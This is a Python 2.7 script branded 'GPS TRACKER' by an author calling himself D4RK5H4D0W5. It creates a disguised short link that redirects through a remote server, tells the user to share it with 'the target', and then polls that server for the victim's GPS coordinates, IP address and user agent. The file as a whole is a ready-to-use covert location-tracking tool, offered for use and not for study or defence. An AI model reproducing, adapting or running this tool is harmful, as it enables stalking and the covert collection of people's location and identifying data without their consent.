#!/usr/bin/python2.7
# -*- coding: utf-8 -*-
#Author D4RK5H4D0W5
#Maklum kalo berantakan ster
G = '\033[0;32m'
C = '\033[0;36m'
W = '\033[0;37m'
R = '\033[0;31m'
Y = '\033[0;33m'
import requests,json,time,os,sys
reload(sys)
sys.setdefaultencoding('utf8')
def logo():
	os.system('clear')
	print '''%s
  __________________  _________
 /  _____/\______   \/   _____/  %sCoded by D4RKSH4D0WS%s
/   \  ___ |     ___/\_____  \   %sThx to https://seccodeid.com%s
\    \_\  \|    |    /        \  %sFB https://bit.ly/2GjT1AZ%s
 \______  /|____|   /_______  /  TRACKER
        \/                  \/
	'''%(C,W,C,W,C,W,C)
def gps(link,id):
	print '\n%s[%s!%s] Share the link to the target : %s'%(W,R,W,link)
	print '%s[%s!%s] Waiting targets, press ctrl + c to exit ...\n'%(W,R,W)
	res_loc=[]
	res_ip=[]
	res_ua=[]
	while True:
		try:
			track=requests.get('https://gpstracker.seccodeid.com/server//server.php?id=%s&type=get'%id).json()['data']
			for arz in track:
				loc=json.loads(arz)['data']['lat']+','+json.loads(arz)['data']['lon']
				ip=json.loads(arz)['data']['ip']
				ua=json.loads(arz)['data']['ua']
				if loc in res_loc:continue
				else:res_loc.append(loc);print '%s[%s✓%s] Location : %s\n'%(W,G,W,loc)
				if ip in res_ip:continue
				else:res_ip.append(ip);print '%s[%s✓%s] IP : %s\n'%(W,G,W,ip)
				if ua in res_ua:continue
				else:res_ua.append(ua);print '%s[%s✓%s] User Agent : %s\n'%(W,G,W,ua)
		except ValueError:pass
		time.sleep(5)
def old():
	logo()
	if open('link').read()=='':print '%s[%s!%s] No old links'%(W,R,W);time.sleep(1);main()
	for link in open('link').read().splitlines():
		print '%s[%s✓%s] %s'%(W,G,W,link)
	link=raw_input('\n%s[%s?%s] Paste the link one : '%(W,Y,W))
	if link=='':print '%s[%s!%s] Invalid input'%(W,R,W);time.sleep(1);old()
	gps(link.split('|')[0],link.split('|')[1])
def new():
	logo()
	title=raw_input('%s[%s?%s] Input title : '%(W,Y,W))
	if title=='':print '%s[%s!%s] Invalid input'%(W,R,W);time.sleep(1);new()
	name=raw_input('%s[%s?%s] Input shortlink name : '%(W,Y,W))
	if name=='':print '%s[%s!%s] Invalid input'%(W,R,W);time.sleep(1);new()
	redirek=raw_input('%s[%s?%s] Input redirect : '%(W,Y,W))
	if redirek=='':print '%s[%s!%s] Invalid input'%(W,R,W);time.sleep(1);new()
	api=requests.post('https://gpstracker.seccodeid.com/server//server.php',data={'type':'generate','title':title,'shortlink_name':name,'redirect':redirek}).json()
	if 'already exists' in str(api):raw_input('%s[%s!%s] Name already exists\n    enter'%(W,R,W));main()
	elif api['data']['link']==None:raw_input('%s[%s!%s] Failed create link\n    enter'%(W,R,W));main()
	elif 'reserved' in str(api['data']['link']):raw_input('%s[%s!%s] Failed create link\n    enter'%(W,R,W));main()
	open('link','a+').write(api['data']['link']+'|'+api['data']['id']+'\n')
	gps(api['data']['link'],api['data']['id'])
def main():
	if os.path.exists('link'):pass
	else:open('link','a+').close()
	logo()
	print '   %s[%s1%s] Old link\n   %s[%s2%s] Create a new link\n   %s[%s0%s] Exit\n'%(W,G,W,W,G,W,W,R,W)
	dark=raw_input('%s[%s?%s] Choice : '%(W,Y,W))
	if dark=='':print '%s[%s!%s] Invalid input'%(W,R,W);time.sleep(1);main()
	if dark=='1':old()
	elif dark=='2':new()
	elif dark=='0':exit()
	else:print '%s[%s!%s] Invalid input'%(W,R,W);time.sleep(1);main()
if __name__=='__main__':
	try:
		main()
	except requests.exceptions.ConnectionError:
		exit('%s[%s!%s] Check internet'%(W,R,W))
	except KeyboardInterrupt:
		exit('%s[%s!%s] Exit'%(W,R,W))
